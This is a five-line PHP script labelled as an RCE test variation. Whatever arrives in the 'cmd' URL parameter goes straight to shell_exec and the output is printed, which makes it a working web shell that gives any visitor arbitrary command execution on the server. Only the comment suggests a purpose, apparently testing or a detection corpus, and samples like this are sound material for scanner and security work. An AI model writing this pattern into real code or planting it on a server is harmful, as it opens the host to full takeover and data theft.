<?php
// RCE test variation #484
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>